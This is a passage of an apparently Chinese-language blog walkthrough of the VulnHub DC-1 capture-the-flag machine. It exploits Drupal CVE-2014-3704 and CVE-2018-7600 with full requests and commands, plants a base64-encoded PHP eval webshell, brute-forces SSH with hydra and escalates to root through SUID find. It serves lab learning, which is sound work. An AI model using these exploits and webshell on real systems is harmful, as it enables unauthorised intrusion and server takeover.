+   Disable the &#34;Put site into maintenance mode&#34; checkbox and save the
+   configuration.
+
+To get started with Drupal 7 administration, visit
+http://drupal.org/getting-started/7/admin
+</code></pre><h4 id=droopescan>droopescan</h4><h3 id=4漏洞映射>4.漏洞映射</h3><h4 id=openvas>OPenVAS</h4><table><thead><tr><th>序号</th><th>Vuln</th></tr></thead><tbody><tr><td>1</td><td>Drupal Core SQL Injection Vulnerability CVE-2014-3704</td></tr><tr><td>2</td><td>Drupal Core Critical Remote Code Execution Vulnerability (SA-CORE-2018-002) (Active Check)CVE-2018-7600</td></tr><tr><td>3</td><td>Sensitive File Disclosure (HTTP)</td></tr><tr><td>4</td><td>Cleartext Transmission of Sensitive Information via HTTP</td></tr><tr><td>5</td><td>SSH Weak Encryption Algorithms Supported</td></tr></tbody></table><h4 id=awvs>AWVS</h4><table><thead><tr><th>序号</th><th>Vuln</th></tr></thead><tbody><tr><td>1</td><td>Drupal Remote Code Execution (SA-CORE-2018-002) CVE-2018-7600</td></tr><tr><td>2</td><td>XML quadratic blowup denial of service attack</td></tr><tr><td>3</td><td>HTML form without CSRF protection</td></tr><tr><td>4</td><td>User credentials are sent in clear text</td></tr><tr><td>5</td><td>Vulnerable Javascript library</td></tr></tbody></table><h4 id=nuclei>Nuclei</h4><p>github下载</p><h2 id=三渗透过程>三、渗透过程</h2><h3 id=cve-2014-3704>CVE-2014-3704</h3><h4 id=命令速查>命令速查</h4><pre tabindex=0><code>grep -rnw /usr/share/exploitdb/ -e &#34;CVE-2014-3704&#34;
+</code></pre><p><img src=/DC_1.assets/20240128140952.png alt=image.png|400></p><pre tabindex=0><code>cat /usr/share/exploitdb/exploits/php/webapps/34992.py
+	/可以查看cve漏洞
+</code></pre><p>可以用漏洞库去查看当前漏洞编号</p><pre tabindex=0><code>searchsploit -m 34992
+</code></pre><p><img src=/DC_1.assets/20240128142633.png alt=image.png|425>
+从自带kali漏洞库运行脚本也可以</p><pre tabindex=0><code>cd /usr/share/exploitdb/exploits/php/webapps/
+	./34992.py
+</code></pre><p><img src=/DC_1.assets/20240128142724.png alt=image.png|425></p><h4 id=创建管理员账号>创建管理员账号</h4><pre tabindex=0><code>┌──(kali💋kali)-[/usr/…/exploitdb/exploits/php/webapps]
+└─$ ./34992.py
+
+  ______                          __     _______  _______ _____
+ |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |
+ |.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |
+ |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |
+ |:  1    /          |__|                 |   |  |:  1   | |:  |
+ |::.. . /                                |   |  |::.. . | |::.|
+ `------&#39;                                 `---&#39;  `-------&#39; `---&#39;
+  _______       __     ___       __            __   __
+ |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.
+ |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |
+ |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|
+ |:  1   |  |__|      |:  |    |___|
+ |::.. . |            |::.|
+ `-------&#39;            `---&#39;
+
+                                 Drup4l =&gt; 7.0 &lt;= 7.31 Sql-1nj3ct10n
+                                              Admin 4cc0unt cr3at0r
+
+                          Discovered by:
+
+                          Stefan  Horst
+                         (CVE-2014-3704)
+
+                           Written by:
+
+                         Claudio Viviani
+
+                      http://www.homelab.it
+
+                         info@homelab.it
+                     homelabit@protonmail.ch
+
+                 https://www.facebook.com/homelabit
+                   https://twitter.com/homelabit
+                 https://plus.google.com/+HomelabIt1/
+       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
+
+Usage: 34992.py -t http[s]://TARGET_URL -u USER -p PASS
+
+Options:
+  -h, --help            show this help message and exit
+  -t TARGET, --target=TARGET
+                        Insert URL: http[s]://www.victim.com
+  -u USERNAME, --username=USERNAME
+                        Insert username
+  -p PWD, --pwd=PWD     Insert password
+</code></pre><p>这是一个用于Drupal 7.0至7.31版本之间的SQL注入漏洞的攻击脚本。它的目标是创建一个具有管理员权限的用户账户。脚本由Claudio Viviani编写，漏洞编号为CVE-2014-3704，该漏洞对应于Drupal的SA-CORE-2014-005安全公告。
+脚本的用法如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ff79c6>Usage</span>: <span style=color:#bd93f9>34992</span>.py <span style=color:#ff79c6>-</span>t http[s]:<span style=color:#ff79c6>//</span>TARGET_URL <span style=color:#ff79c6>-</span>u <span style=color:#ff79c6>USER</span> <span style=color:#ff79c6>-</span>p PASS
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>Options</span>:
+</span></span><span style=display:flex><span>  <span style=color:#ff79c6>-</span>h, <span style=color:#6272a4>--help            show this help message and exit
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#ff79c6>-</span>t TARGET, <span style=color:#6272a4>--target=TARGET
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>                        <span style=color:#ff79c6>Insert</span> URL: http[s]:<span style=color:#ff79c6>//</span>www.victim.com
+</span></span><span style=display:flex><span>  <span style=color:#ff79c6>-</span>u USERNAME, <span style=color:#6272a4>--username=USERNAME
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>                        <span style=color:#ff79c6>Insert</span> username
+</span></span><span style=display:flex><span>  <span style=color:#ff79c6>-</span>p PWD, <span style=color:#6272a4>--pwd=PWD     Insert password
+</span></span></span></code></pre></div><p>通过在URL中构造包含SQL注入负载的POST请求，脚本试图创建具有指定用户名和密码的管理员用户。脚本的目的是演示Drupal 7中的SQL注入漏洞，仅供教育和学习目的使用。</p><p>执行一下脚本</p><pre tabindex=0><code>──(kali💋kali)-[/usr/…/exploitdb/exploits/php/webapps]
+└─$ ./34992.py -t http://10.4.7.135 -u shuaidan -p 123456                  130 ⨯
+
+  ______                          __     _______  _______ _____
+ |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |
+ |.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |
+ |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |
+ |:  1    /          |__|                 |   |  |:  1   | |:  |
+ |::.. . /                                |   |  |::.. . | |::.|
+ `------&#39;                                 `---&#39;  `-------&#39; `---&#39;
+  _______       __     ___       __            __   __
+ |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.
+ |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |
+ |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|
+ |:  1   |  |__|      |:  |    |___|
+ |::.. . |            |::.|
+ `-------&#39;            `---&#39;
+
+                                 Drup4l =&gt; 7.0 &lt;= 7.31 Sql-1nj3ct10n
+                                              Admin 4cc0unt cr3at0r
+
+                          Discovered by:
+
+                          Stefan  Horst
+                         (CVE-2014-3704)
+
+                           Written by:
+
+                         Claudio Viviani
+
+                      http://www.homelab.it
+
+                         info@homelab.it
+                     homelabit@protonmail.ch
+
+                 https://www.facebook.com/homelabit
+                   https://twitter.com/homelabit
+                 https://plus.google.com/+HomelabIt1/
+       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
+
+[!] VULNERABLE!
+
+[!] Administrator user created!
+
+[*] Login: shuaidan
+[*] Pass: 123456
+[*] Url: http://10.4.7.135/?q=node&amp;destination=node
+</code></pre><h4 id=登陆成功>登陆成功</h4><p><img src=/DC_1.assets/20240128160708.png alt=image.png|400></p><h4 id=falg3>falg3</h4><p>随便浏览下页面，即可发现 falg3，如下：
+<img src=/DC_1.assets/20240128160923.png alt=image.png|375></p><pre tabindex=0><code>Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.
+</code></pre><p><img src=/DC_1.assets/20240128160952.png alt=image.png></p><h3 id=cve-2018-7600>CVE-2018-7600</h3><h4 id=命令速查-1>命令速查</h4><pre tabindex=0><code>grep -rnw /usr/share/exploitdb/ -e &#34;CVE-2018-7600&#34;
+</code></pre><p><img src=/DC_1.assets/20240128154100.png alt=image.png|475>
+此漏洞的利用需要两次 HTTP 请求</p><h4 id=第一次请求>第一次请求</h4><p>漏洞点</p><pre tabindex=0><code>POST /?q=user/password&amp;name[%23post_render][]=passthru&amp;name[%23type]=markup&amp;name[%23markup]=id HTTP/1.1
+
+form_id=user_pass&amp;_triggering_element_name=name
+</code></pre><p>先将<code>/uesr/login/</code>发送到重发器
+<img src=/DC_1.assets/20240128175836.png alt=image.png|400>
+修改请求方法为POST
+<img src=/DC_1.assets/20240128181758.png alt=image.png|400>
+复制漏洞点进去在做一个精简
+<img src=/DC_1.assets/20240128181947.png alt=|400>
+放包之后在相应当中找到关键字段<code>form_build</code>
+取得字符串form-WiPAi0zf6-GA_ybHV-nQGgAEuMP_Q4fNMtQw0t2YlmU
+<img src=/DC_1.assets/20240128182240.png alt=image.png|450></p><h4 id=第二次请求>第二次请求</h4><p>再次发送到Repeater模块
+<img src=/DC_1.assets/20240128182345.png alt=image.png>
+构造请求</p><pre tabindex=0><code>POST /?q=file/ajax/name/%23value/form-WiPAi0zf6-GA_ybHV-nQGgAEuMP_Q4fNMtQw0t2YlmU HTTP/1.1
+
+Host: 10.4.7.136
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62 
+
+form_build_id=form-WiPAi0zf6-GA_ybHV-nQGgAEuMP_Q4fNMtQw0t2YlmU   
+	//这个和第一次请求的`form_build`取值一样 且每次这个值都会变
+
+
+form-YUUC0jSI5Vwzt0zd20-P8S12K4OGKOsixjsxwiDmdWs
+</code></pre><p>命令执行成功
+<img src=/DC_1.assets/20240129193003.png alt=image.png|450>
+直接执行第一次请求构造的命令，在根目录下创建 shell.php 文件，即一句话木马。
+命令构造</p><pre tabindex=0><code>将刚才构造的id改为一句话木马
+&lt;?php @eval($_REQUEST[777])?&gt;  /将一句话木马转为base64编码
+	PD9waHAgQGV2YWwoJF9SRVFVRVNUWzc3N10pPz4=
+</code></pre><p><img src=/DC_1.assets/20240129193607.png alt=image.png|375></p><pre tabindex=0><code>echo &#34;PD9waHAgQGV2YWwoJF9SRVFVRVNUWzc3N10pPz4=&#34; | base64 -d | tee ./shell.php
+
+1. `echo &#34;PD9waHAgQGV2YWwoJF9SRVFVRVNUWzc3N10pPz4=&#34;`: 这部分将Base64编码的字符串打印到标准输出（终端屏幕）。
+2. `| base64 -d`: 这个管道操作符 `|` 将前一个命令的输出传递给下一个命令。`base64 -d` 表示对Base64编码的输入进行解码。
+3. `| tee ./shell.php`: 这个部分使用 `tee` 命令将前一个解码的输出同时输出到标准输出（终端屏幕）和一个文件 `./shell.php` 中。
+    
+因此，这个命令的目的是将Base64编码的字符串解码并保存到一个名为 `shell.php` 的文件中。这可能是一个恶意的命令，因为它创建了一个名为 `shell.php` 的文件，通常攻击者可能会尝试在目标系统上放置一个恶意的Webshell。请小心使用和执行这样的命令，确保了解其含义和来源
+</code></pre><p>在进行一个关键字的url编码 （快捷键ctrl+u）</p><pre tabindex=0><code>echo+&#34;PD9waHAgQGV2YWwoJF9SRVFVRVNUWzc3N10pPz4%3d&#34;+|+base64+-d+|+tee+./shell.php
+</code></pre><p><img src=/DC_1.assets/8fdcad1637c72584757d59ba274b477.png alt=|475>
+发送请求之后会从新得到一个<code>form_build id</code>>在进行第二次请求
+<img src=/DC_1.assets/20240129194606.png alt=image.png|375></p><pre tabindex=0><code>form-OiY8huCoUdreJAD7QQDFF8hrELPtoWF7POFiZYJcI9I
+</code></pre><p>反弹shell建立成功
+<img src=/DC_1.assets/20240129194712.png alt=image.png|425></p><p>蚁剑进行连接密码777
+<img src=/DC_1.assets/20240129194918.png alt=image.png|400></p><h4 id=flag1>flag1</h4><p><img src=/DC_1.assets/20240129195148.png alt=image.png|425></p><h4 id=flag2>flag2</h4><p><img src=/DC_1.assets/20240129195326.png alt=image.png|425></p><h4 id=flag4>flag4</h4><p><img src=/DC_1.assets/20240129202252.png alt=image.png></p><h2 id=四提权>四、提权</h2><p>msf直接运用CVE-2018-7600漏洞</p><pre tabindex=0><code>msfconsole
+search cve:2018-7600
+use 0
+</code></pre><p><img src=/DC_1.assets/20240129202651.png alt=image.png|400></p><pre tabindex=0><code>show options
+查看一下当前选定模块或payload的配置选项的命令
+</code></pre><p><img src=/DC_1.assets/20240129202819.png alt=image.png|425></p><pre tabindex=0><code>set RHOSTS 10.4.7.136
+run
+meterpreter &gt; shell
+python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+www-data@DC-1:/var/www$ 
+</code></pre><p><img src=/DC_1.assets/20240129203242.png alt=image.png|425></p><p>查看用户信息发现有一个flag4用户名进行一个ssh密码的爆破
+<img src=/DC_1.assets/20240129203558.png alt=image.png|375></p><pre tabindex=0><code>sudo hydra -l flag4 -P sqlmap.txt ssh://10.4.7.136 -V 
+</code></pre><p><img src=/DC_1.assets/20240129205550.png alt=image.png|425></p><h4 id=ssh远程连接>ssh远程连接</h4><pre tabindex=0><code>ssh flag4@10.4.7.136 
+	orange
+</code></pre><h4 id=find提权>find提权</h4><pre tabindex=0><code>flag4@DC-1:~$ find / -perm -u=s 2&gt;/dev/null
+
+- `find`: 这是一个用于在文件系统中查找文件的命令。  
+- `/`: 这是要查找的起始目录。在这种情况下，它是根目录，即整个文件系统。
+- `-perm -u=s`: 这是 `find` 命令的选项之一，用于指定要查找的文件权限。在这里，`-perm` 表示按照指定的权限进行查找。 `-u=s` 表示查找那些设置了 SUID 位的文件。
+- `2&gt;/dev/null`: 这部分是将标准错误输出重定向到 `/dev/null`，以便忽略任何由于权限不足而无法访问的目录导致的错误信息。  
+因此，这个命令的意思是在整个文件系统中查找设置了 SUID 位的文件，并将结果输出到标准输出。
+</code></pre><p><img src=/DC_1.assets/20240129210123.png alt=image.png|450></p><pre tabindex=0><code>flag4@DC-1:~$ cd /tmp
+flag4@DC-1:/tmp$ mkdir shuaidan
+flag4@DC-1:/tmp$ ls
+shuaidan
+flag4@DC-1:/tmp$ find shuaidan/ -exec whoami \;
+root
+flag4@DC-1:/tmp$ find shuaidan/ -exec /bin/sh \;
+# id
+uid=1001(flag4) gid=1001(flag4) euid=0(root) groups=0(root),1001(flag4)
+# cd /root
+# ls
+thefinalflag.txt
+# cat thefinalflag.txt
+</code></pre><p><img src=/DC_1.assets/20240129210805.png alt=image.png|450>
+成功</p><hr><ul class=pager><li class=previous><a href=/post/2023-12-25-vulnhub2018_derpnstink%E9%9D%B6%E6%9C%BA%E6%8F%90%E6%9D%83/vulnhub2018_derpnstink/ data-toggle=tooltip data-placement=top title=VulnHub2018_DeRPnStiNK靶机提权>&larr;
+Previous Post</a></li></ul></div><div class="col-lg-2 col-lg-offset-0
+visible-lg-block
+sidebar-container
+catalog-container"><div class=side-catalog><hr class="hidden-sm hidden-xs"><h5><a class=catalog-toggle href=#>CATALOG</a></h5><ul class=catalog-body></ul></div></div><div class="col-lg-8 col-lg-offset-2
+col-md-10 col-md-offset-1
+sidebar-container"><section><hr class="hidden-sm hidden-xs"><h5><a href=/tags/>FEATURED TAGS</a></h5><div class=tags></div></section><section><hr><h5>FRIENDS</h5><ul class=list-inline><li><a target=_blank href=https://inecho.cc>Jia Lun的博客</a></li><li><a target=_blank href=https://inecho.cc>哈哈哈哈哈哈哈哈</a></li></ul></section></div></div></div></article><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center"><li><a href=mailto:shuaidan0@gmail.com><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=full%20profile%20url%20in%20twitter><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-twitter fa-stack-1x fa-inverse"></i></span></a></li><li><a target=_blank href=https://images.cnblogs.com/cnblogs_com/blogs/815100/galleries/2372332/o_240205031919_QR_code.jpg><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-weixin fa-stack-1x fa-inverse"></i></span></a></li><li><a target=_blank href=https://github.com/yourgithub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li><li><a target=_blank href=full%20profile%20url%20in%20instagram><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-instagram fa-stack-1x fa-inverse"></i></span></a></li><li><a href rel=alternate type=application/rss+xml title="My Blog"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fas fa-rss fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="copyright text-muted">Copyright &copy; My Blog 2024</p></div></div></div></footer><script>function loadAsync(e,t){var s=document,o="script",n=s.createElement(o),i=s.getElementsByTagName(o)[0];n.src=e,t&&n.addEventListener("load",function(e){t(null,e)},!1),i.parentNode.insertBefore(n,i)}</script><script>$("#tag_cloud").length!==0&&loadAsync("/js/jquery.tagcloud.js",function(){$.fn.tagcloud.defaults={color:{start:"#bbbbee",end:"#0085a1"}},$("#tag_cloud a").tagcloud()})</script><script>loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js",function(){var e=document.querySelector("nav");e&&FastClick.attach(e)})</script><script type=text/javascript>function generateCatalog(e){_containerSelector="div.post-container";var t,n,s,o,i,a=$(_containerSelector),r=a.find("h1,h2,h3,h4,h5,h6");return $(e).html(""),r.each(function(){t=$(this).prop("tagName").toLowerCase(),o="#"+$(this).prop("id"),n=$(this).text(),i=$('<a href="'+o+'" rel="nofollow">'+n+"</a>"),s=$('<li class="'+t+'_nav"></li>').append(i),$(e).append(s)}),!0}generateCatalog(".catalog-body"),$(".catalog-toggle").click(function(e){e.preventDefault(),$(".side-catalog").toggleClass("fold")}),loadAsync("/js/jquery.nav.js",function(){$(".catalog-body").onePageNav({currentClass:"active",changeHash:!1,easing:"swing",filter:"",scrollSpeed:700,scrollOffset:0,scrollThreshold:.2,begin:null,end:null,scrollChange:null,padding:80})})</script></body></html>
